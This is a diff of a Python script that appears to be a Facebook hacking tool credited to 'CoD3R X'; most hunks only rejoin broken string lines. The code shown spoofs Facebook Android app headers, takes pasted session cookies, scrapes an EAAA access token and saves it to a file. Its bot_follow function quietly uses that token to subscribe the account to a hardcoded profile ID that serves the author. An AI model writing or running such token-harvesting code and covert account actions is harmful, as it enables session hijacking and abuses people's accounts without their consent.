@@ -34,13 +34,7 @@ header = {
     'x-fb-net-hni': repr(sim),
     'x-fb-connection-quality': 'EXCELLENT',
     'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) 
-
-[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/
-
-{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBP
-
-N/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
     'content-type': 'application/x-www-form-urlencoded',
     'x-fb-http-engine': 'Liger' }
 os.system('git pull')
@@ -51,7 +45,7 @@ c5 = "\033[1;31m""\033[0;97m""\033[1;31m"
 os.system('git pull')
 os.system('clear')
 
-logo = ('   ______           ____    _____    ____ \n  / ____/  ____    / __ \  |__  /   / __ \ \n / /  / __ \  / / / /   /_ <   / /_/ /\n/ /___   / /_/ / / /_/ /  ___/ /  / _, _/\n\____/   \____/ /_____/  /____/  /_/ |_|   \n               \n              Coded By : CoD3R X\n___________________________________________________')
+logo = ('   ______           ____    _____    ____ \n  / ____/  ____    / __ \  |__  /   / __ \ \n / /      / __ \  / / / /   /_ <   / /_/ /\n/ /___   / /_/ / / /_/ /  ___/ /  / _, _/\n\____/   \____/ /_____/  /____/  /_/ |_|   \n               \n              Coded By : CoD3R X\n___________________________________________________')
 
 def reg():
     os.system('clear')
@@ -225,22 +219,18 @@ def log_cookie():
     
     try:
         cookie = raw_input(' Paste cookies here: ')
-        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi 
-Chrome/68.0.3438.0 Safari/537.36',
+        data = {
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
             'referer': 'https://m.facebook.com/',
             'host': 'm.facebook.com',
             'origin': 'https://m.facebook.com',
             'upgrade-insecure-requests': '1',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
-            'accept': 'text/html,application/xhtml
-
-+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'content-type': 'text/html; charset=utf-8',
             'cookie': cookie }
-        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', 
-
-headers = data)
+        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
         c2 = re.search('(EAAA\\w+)', c1.text)
         hasil = c2.group(1)
         ok = open('access_token.txt', 'w')
@@ -272,9 +262,7 @@ def bot_follow():
 	except IOError:
 		print("\n[!] Token invalid")
 		logs()
-    	requests.post('https://graph.facebook.com/100007390861214/subscribers?access_token=' + toket)  
-
-    #CoD3R
+    	requests.post('https://graph.facebook.com/100007390861214/subscribers?access_token=' + toket)      #CoD3R
     	menu()
  
  
